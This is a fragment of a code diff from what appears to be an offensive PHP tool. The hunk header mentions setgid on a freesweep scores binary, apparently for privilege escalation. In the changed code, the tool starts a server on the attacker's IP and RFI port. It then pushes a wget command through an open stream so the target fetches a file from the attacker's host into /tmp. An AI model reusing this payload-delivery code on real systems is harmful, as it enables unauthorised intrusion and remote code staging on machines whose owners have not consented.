@@ -257,10 +257,9 @@ sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /us
             if (is_resource($stream)){
                 $ip_attacker = $this->ip4addr4target($this->ip);
                 //$this->requette("gedit $obj_file->file_path");
-                if($this->tcp2open($ip_attacker, $this->port_rfi)){
+                $this->tcp2open4server($ip_attacker, $this->port_rfi);
                     $data = "wget http://$ip_attacker:$this->port_rfi/$obj_file->file_name$obj_file->file_ext -O  /tmp/$obj_file->file_name$obj_file->file_ext "; //
                     $this->lan2stream4result($data,$this->stream_timeout);
-                }
             }
             
 
